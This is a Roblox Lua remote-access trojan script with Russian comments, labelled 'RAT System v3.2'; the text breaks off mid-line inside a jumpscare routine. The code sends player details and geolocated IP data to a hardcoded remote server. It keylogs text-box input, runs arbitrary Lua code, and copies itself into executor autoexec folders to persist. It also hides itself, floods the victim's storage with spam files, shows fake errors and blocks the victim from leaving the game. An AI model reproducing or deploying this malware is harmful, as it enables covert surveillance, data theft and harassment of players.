local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")
local CoreGui = game:GetService("CoreGui")
local TeleportService = game:GetService("TeleportService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local SERVER_URL = "https://ratserver-6wo3.onrender.com"
local player = Players.LocalPlayer

local function getDeviceType()
    if UserInputService.TouchEnabled then
        if UserInputService.MouseEnabled then
            return "Tablet"
        else
            return "Mobile"
        end
    else
        return "PC"
    end
end

local keyloggerEnabled = false
local keylogBuffer = ""
local lastSendTime = os.time()
local scriptHidden = false
local lastUserUpdate = 0
local deviceType = getDeviceType()
local antiLeaveEnabled = false
local antiLeaveTarget = nil
local originalTeleportService = nil
local originalCoreGui = nil
local lastAntiLeaveAction = 0
local antiLeaveCooldown = 1

-- ========== ANTI-LEAVE СИСТЕМА (ПРОСТАЯ) ==========
local function setupSimpleAntiLeave()
    warn("[AntiLeave] Инициализация системы...")
    
    local function createWarningGUI()
        local gui = Instance.new("ScreenGui")
        gui.Name = "AntiLeaveWarning"
        gui.Parent = player:WaitForChild("PlayerGui")
        gui.ResetOnSpawn = false
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.5, 0, 0.2, 0)
        frame.Position = UDim2.new(0.25, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
        frame.BorderSizePixel = 3
        frame.Parent = gui
        
        local text = Instance.new("TextLabel")
        text.Size = UDim2.new(0.9, 0, 0.8, 0)
        text.Position = UDim2.new(0.05, 0, 0.1, 0)
        text.Text = "🚫 ВЫХОД ЗАПРЕЩЕН!\nAntiLeave System активен"
        text.TextColor3 = Color3.fromRGB(255, 50, 50)
        text.TextScaled = true
        text.Font = Enum.Font.GothamBold
        text.BackgroundTransparency = 1
        text.Parent = frame
        
        return gui
    end

    local function shouldBlockAction()
        if not antiLeaveEnabled then 
            return false 
        end
        
        if antiLeaveTarget and antiLeaveTarget ~= player.Name then
            return false
        end
        
        local currentTime = tick()
        if currentTime - lastAntiLeaveAction < antiLeaveCooldown then
            return false
        end
        
        lastAntiLeaveAction = currentTime
        return true
    end

    local function showWarning()
        task.spawn(function()
            local gui = createWarningGUI()
            
            task.delay(3, function()
                pcall(function()
                    gui:Destroy()
                end)
            end)
        end)
    end

    -- Обработчик выхода из игры
    Players.PlayerRemoving:Connect(function(playerLeaving)
        if playerLeaving == player then
            warn("[AntiLeave] Игрок пытается выйти:", player.Name)
            
            if shouldBlockAction() then
                warn("[AntiLeave] Блокируем выход!")
                showWarning()
                
                -- Перезагружаем персонажа
                task.delay(0.5, function()
                    if player.Character then
                        player.Character:BreakJoints()
                    end
                    player:LoadCharacter()
                end)
            end
        end
    end)

    -- Блокировка меню Escape
    UserInputService.InputBegan:Connect(function(input, processed)
        if not processed and input.KeyCode == Enum.KeyCode.Escape then
            if shouldBlockAction() then
                warn("[AntiLeave] Блокируем меню Escape")
                showWarning()
                
                -- Закрываем меню
                task.spawn(function()
                    local success = pcall(function()
                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, nil)
                        task.wait(0.1)
                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, nil)
                    end)
                end)
            end
        end
    end)

    return {
        enable = function(target)
            antiLeaveEnabled = true
            antiLeaveTarget = target
            
            warn("[AntiLeave] Система включена для " .. (target or "всех игроков"))
            
            -- Сообщение в чат
            if chatSystem then
                chatSystem.addMessage("AntiLeave", 
                    "🛡️ Система блокировки выхода активирована!" .. 
                    (target and (" Цель: " .. target) or ""), 
                    true
                )
            end
        end,
        
        disable = function()
            antiLeaveEnabled = false
            antiLeaveTarget = nil
            
            warn("[AntiLeave] Система выключена")
            
            if chatSystem then
                chatSystem.addMessage("AntiLeave", "🛡️ Система блокировки выхода деактивирована", true)
            end
        end,
        
        status = function()
            return {
                enabled = antiLeaveEnabled,
                target = antiLeaveTarget
            }
        end
    }
end

-- Инициализация AntiLeave системы
local antiLeaveSystem = setupSimpleAntiLeave()

-- ========== ОСТАЛЬНЫЕ ФУНКЦИИ ==========
local function safeCheck(funcName)
    if funcName == "writefile" then
        return writefile ~= nil
    elseif funcName == "readfile" then
        return readfile ~= nil
    elseif funcName == "listfiles" then
        return listfiles ~= nil
    elseif funcName == "makefolder" then
        return makefolder ~= nil
    elseif funcName == "delfolder" then
        return delfolder ~= nil
    elseif funcName == "delfile" then
        return delfile ~= nil
    elseif funcName == "isfolder" then
        return isfolder ~= nil
    elseif funcName == "identifyexecutor" then
        return identifyexecutor ~= nil
    elseif funcName == "getcustomasset" then
        return getcustomasset ~= nil
    elseif funcName == "saveinstance" then
        return saveinstance ~= nil
    elseif funcName == "getconnections" then
        return getconnections ~= nil
    elseif funcName == "getgc" then
        return getgc ~= nil
    elseif funcName == "getrenv" then
        return getrenv ~= nil
    elseif funcName == "getreg" then
        return getreg ~= nil
    elseif funcName == "getinstances" then
        return getinstances ~= nil
    elseif funcName == "getnilinstances" then
        return getnilinstances ~= nil
    elseif funcName == "gethui" then
        return gethui ~= nil
    elseif funcName == "getscripts" then
        return getscripts ~= nil
    elseif funcName == "isnetworkowner" then
        return isnetworkowner ~= nil
    elseif funcName == "request" then
        return (syn and syn.request) or (request) or (http and http.request)
    end
    return false
end

local function autoInstallToAutoexec()
    if deviceType ~= "PC" or not safeCheck("writefile") then
        return false
    end
    
    local success = pcall(function()
        local scriptSource = "-- RAT System v3.2\n" .. tostring(script.Source)
        
        local autoexecPaths = {
            "autoexec.lua",
            "autoexec/startup.lua",
            "workspace/autoexec.lua",
            "scripts/rat.lua",
            "autoexec/rat.lua",
            "startup.lua",
        }
        
        if syn and syn.writefile then
            table.insert(autoexecPaths, "synapse/autoexec.lua")
            table.insert(autoexecPaths, "synapse/workspace/rat.lua")
        end
        
        if krnl then
            table.insert(autoexecPaths, "krnl/autoexec.lua")
        end
        
        if fluxus then
            table.insert(autoexecPaths, "fluxus/autoexec.lua")
        end
        
        local installedCount = 0
        for _, path in ipairs(autoexecPaths) do
            pcall(function()
                writefile(path, scriptSource)
                installedCount = installedCount + 1
            end)
        end
        
        return installedCount > 0
    end)
    
    return success or false
end

local function httpRequest(params)
    local requestFunc
    
    if syn and syn.request then
        requestFunc = syn.request
    elseif request then
        requestFunc = request
    elseif http and http.request then
        requestFunc = http.request
    else
        return nil
    end
    
    local success, response = pcall(requestFunc, params)
    return success and response or nil
end

local function captureScreenshot()
    if RunService:IsStudio() then
        return nil
    end
    
    local screenshot
    
    if getgenv and getgenv().takescreenshot then
        screenshot = getgenv().takescreenshot()
    elseif screencap then
        screenshot = screencap()
    else
        return nil
    end
    
    if screenshot then
        local success, encoded = pcall(function()
            return HttpService:JSONEncode(screenshot)
        end)
        return success and encoded or nil
    end
    
    return nil
end

local function sendUserInfo()
    local currentTime = os.time()
    if currentTime - lastUserUpdate < 15 then
        return
    end
    
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    local success = pcall(function()
        local response = httpRequest({
            Url = SERVER_URL.."/users",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                player = playerName,
                place = placeName,
                executor = executor,
                device = deviceType
            })
        })
        return response ~= nil
    end)
    
    if success then
        lastUserUpdate = currentTime
    end
end

local function sendInjectNotification()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s\nCity: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A", 
                ipInfo.city or "N/A"
            )
        end
    end

    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end
    
    httpRequest({
        Url = SERVER_URL.."/command",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            command = "inject_notify",
            args = {playerName, placeName, ipData, executor, deviceType}
        })
    })
end

local function getHardwareInfo()
    local playerName = player.Name
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local placeName = success and placeInfo.Name or "Unknown"
    
    local ipData = "N/A"
    local ipResponse = httpRequest({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    if ipResponse and ipResponse.Body then
        local success, ipInfo = pcall(function()
            return HttpService:JSONDecode(ipResponse.Body)
        end)
        if success and ipInfo and ipInfo.status ~= "fail" then
            ipData = string.format(
                "IP: %s\nCountry: %s",
                ipInfo.query or "N/A",
                ipInfo.country or "N/A"
            )
        end
    end

    local fps = 0
    local ping = 0
    
    local success1, fpsValue = pcall(function()
        return math.floor(workspace:GetRealPhysicsFPS())
    end)
    if success1 then fps = fpsValue end
    
    local success2, pingValue = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    if success2 then ping = pingValue end

    local executor = "Unknown"
    if safeCheck("identifyexecutor") then
        local success, exec = pcall(identifyexecutor)
        if success then
            executor = exec
        end
    end

    local systemInfo = {
        device_type = deviceType,
        touch_enabled = UserInputService.TouchEnabled,
        mouse_enabled = UserInputService.MouseEnabled,
        keyboard_enabled = UserInputService.KeyboardEnabled,
        screen_size = workspace.CurrentCamera.ViewportSize
    }

    local hardwareData = {
        player = playerName,
        game = placeName,
        fps = fps,
        ping = ping,
        executor = executor,
        ip_info = ipData,
        system = systemInfo
    }
    
    return hardwareData
end

local function memorySpam(fileCount)
    if not safeCheck("writefile") then
        return 0
    end
    
    local successCount = 0
    
    for i = 1, fileCount do
        local filename = "spam_file_" .. i .. "_" .. math.random(1000, 9999) .. ".txt"
        
        local success = pcall(function()
            local bigContent = ""
            for j = 1, 100 do
                bigContent = bigContent .. "SPAM_" .. math.random(100000, 999999) .. "_" .. 
                           string.rep("X", 100) .. "\n"
            end
            
            writefile(filename, bigContent)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)
    end
    
    return successCount
end

local function gallerySpam(imageCount)
    if not safeCheck("writefile") then
        return 0
    end
    
    local successCount = 0
    
    for i = 1, imageCount do
        local filename = "video_" .. i .. "_" .. math.random(1000, 9999) .. ".mp4"
        
        local success = pcall(function()
            local content = "fake_video_content_" .. math.random(100000, 999999)
            writefile(filename, content)
            return true
        end)
        
        if success then
            successCount = successCount + 1
        end
        
        task.wait(0.1)
    end
    
    return successCount
end

local function executeLua(code)
    local func, err = loadstring(code)
    if func then
        local success, result = pcall(func)
        if success then
            return "Успешно: " .. tostring(result)
        else
            return "Ошибка выполнения: " .. tostring(result)
        end
    else
        return "Ошибка компиляции: " .. tostring(err)
    end
end

local function showFakeError(message)
    local success = pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "FakeError"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.5, 0, 0.3, 0)
        frame.Position = UDim2.new(0.25, 0, 0.35, 0)
        frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        frame.BorderColor3 = Color3.fromRGB(255, 85, 85)
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "⚠ ОШИБКА СИСТЕМЫ ⚠\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 85, 85)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        task.delay(10, function()
            pcall(function()
                if gui and gui.Parent then
                    gui:Destroy()
                end
            end)
        end)
        
        return true
    end)
    
    return success
end

local function showPopupMessage(message)
    local success = pcall(function()
        local gui = Instance.new("ScreenGui")
        gui.Name = "PopupMessage"
        gui.Parent = player:WaitForChild("PlayerGui")
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.4, 0, 0.2, 0)
        frame.Position = UDim2.new(0.3, 0, 0.4, 0)
        frame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
        frame.BorderColor3 = Color3.fromRGB(70, 70, 100)
        frame.BorderSizePixel = 2
        frame.Parent = gui
        
        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(0.9, 0, 0.8, 0)
        textLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
        textLabel.Text = "📢 Сообщение:\n\n"..message
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.Gotham
        textLabel.BackgroundTransparency = 1
        textLabel.Parent = frame
        
        frame.BackgroundTransparency = 1
        textLabel.TextTransparency = 1
        
        local tweenIn = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1})
        local tweenTextIn = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 0})
        
        tweenIn:Play()
        tweenTextIn:Play()
        
        task.delay(7, function()
            local tweenOut = TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
            local tweenTextOut = TweenService:Create(textLabel, TweenInfo.new(0.5), {TextTransparency = 1})
            
            tweenOut:Play()
            tweenTextOut:Play()
            
            task.delay(0.6, function()
                pcall(function()
                    if gui and gui.Parent then
                        gui:Destroy()
                    end
                end)
            end)
        end)
        
        return true
    end)
    
    return success
end

local function hideScript()
    if scriptHidden then return true end
    
    local success = pcall(function()
        if syn and syn.protect_gui then
            pcall(syn.protect_gui, script.Parent)
        end
        
        script.Name = "UI_"..tostring(math.random(10000,99999))
        
        if getgenv and getgenv().setthreadidentity then
            pcall(getgenv().setthreadidentity, 7)
        end
        
        if script.Parent ~= CoreGui then
            script.Parent = CoreGui
        end
    end)
    
    scriptHidden = success
    return success
end

local function setupKeylogger()
    local success = pcall(function()
        UserInputService.TextBoxFocused:Connect(function(textBox)
            if keyloggerEnabled then
                textBox.FocusLost:Connect(function()
                    if textBox.Text and textBox.Text ~= "" then
                        keylogBuffer = keylogBuffer .. "[Input] " .. textBox.Text .. "\n"
                    end
                end)
            end
        end)
        return true
    end)
    return success
end

local function setupChat()
    local success, result = pcall(function()
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "RatChat"
        screenGui.Parent = player:WaitForChild("PlayerGui")
        screenGui.ResetOnSpawn = false
        screenGui.Enabled = false

        local chatFrame = Instance.new("Frame")
        chatFrame.Size = UDim2.new(0.4, 0, 0.6, 0)
        chatFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        chatFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        chatFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
        chatFrame.BackgroundTransparency = 0.3
        chatFrame.Active = true
        chatFrame.Draggable = true
        chatFrame.Parent = screenGui

        local scrollingFrame = Instance.new("ScrollingFrame")
        scrollingFrame.Size = UDim2.new(1, -10, 1, -50)
        scrollingFrame.Position = UDim2.new(0, 5, 0, 5)
        scrollingFrame.BackgroundTransparency = 1
        scrollingFrame.ScrollBarThickness = 5
        scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scrollingFrame.Parent = chatFrame

        local textBox = Instance.new("TextBox")
        textBox.Size = UDim2.new(1, -60, 0, 30)
        textBox.Position = UDim2.new(0, 5, 1, -35)
        textBox.PlaceholderText = "Сообщение..."
        textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        textBox.ClearTextOnFocus = false
        textBox.Parent = chatFrame

        local sendButton = Instance.new("TextButton")
        sendButton.Size = UDim2.new(0, 50, 0, 30)
        sendButton.Position = UDim2.new(1, -55, 1, -35)
        sendButton.Text = "Отпр."
        sendButton.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
        sendButton.Parent = chatFrame

        local function addMessage(sender, text, isSystem)
            local messageFrame = Instance.new("Frame")
            messageFrame.Size = UDim2.new(1, 0, 0, 0)
            messageFrame.AutomaticSize = Enum.AutomaticSize.Y
            messageFrame.BackgroundTransparency = 1
            messageFrame.Parent = scrollingFrame

            local bubble = Instance.new("Frame")
            bubble.Size = UDim2.new(0.8, 0, 0, 0)
            bubble.AutomaticSize = Enum.AutomaticSize.Y
            bubble.BackgroundColor3 = isSystem and Color3.fromRGB(80, 80, 100) or 
                                    (sender == player.Name and Color3.fromRGB(0, 110, 220) or Color3.fromRGB(70, 70, 90))
            bubble.BackgroundTransparency = 0.1
            bubble.Parent = messageFrame

            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(0.9, 0, 0, 0)
            textLabel.Position = UDim2.new(0.05, 0, 0, 5)
            textLabel.AutomaticSize = Enum.AutomaticSize.Y
            textLabel.Text = sender..": "..text
            textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
            textLabel.TextWrapped = true
            textLabel.BackgroundTransparency = 1
            textLabel.Parent = bubble

            scrollingFrame.CanvasPosition = Vector2.new(0, scrollingFrame.AbsoluteCanvasSize.Y)
            
            if sender == player.Name and not isSystem then
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "user_chat",
                        args = {sender, text}
                    })
                })
            end
        end

        local function sendMessage()
            local text = string.gsub(textBox.Text, "^%s*(.-)%s*$", "%1")
            if text ~= "" then
                addMessage(player.Name, text)
                textBox.Text = ""
            end
        end

        textBox.FocusLost:Connect(function(enterPressed)
            if enterPressed then sendMessage() end
        end)

        sendButton.MouseButton1Click:Connect(sendMessage)

        addMessage("Система", "Чат RAT активирован", true)

        return {
            gui = screenGui,
            enabled = false,
            addMessage = addMessage,
            sendMessage = sendMessage
        }
    end)
    
    return success and result or nil
end

local chatSystem = setupChat()

local function createFullscreenGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "JumpscareUI"
    screenGui.Parent = player:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    return screenGui
end

local function loadImageFromURL(url, defaultAssetId)
    local success, imageData = pcall(function()
        return game:HttpGet(url, true)
    end)
    
    if success and imageData and #imageData > 100 then
        local tempFile = "jumpscare_img_" .. math.random(10000,99999) .. ".png"
        writefile(tempFile, imageData)
        
        if getcustomasset then
            local asset = getcustomasset(tempFile)
            if asset then
                return asset
            end
        end
    end
    
    return defaultAssetId and "rbxassetid://" .. defaultAssetId or nil
end

local function jeffKillerJumpscare()
    local screenGui = createFullscreenGUI()
    
    local jeffImage = Instance.new("ImageLabel")
    jeffImage.Size = UDim2.new(1, 0, 1, 0)
    jeffImage.Position = UDim2.new(0, 0, 0, 0)
    jeffImage.BackgroundTransparency = 1
    jeffImage.ImageTransparency = 1
    jeffImage.ScaleType = Enum.ScaleType.Crop
    jeffImage.ZIndex
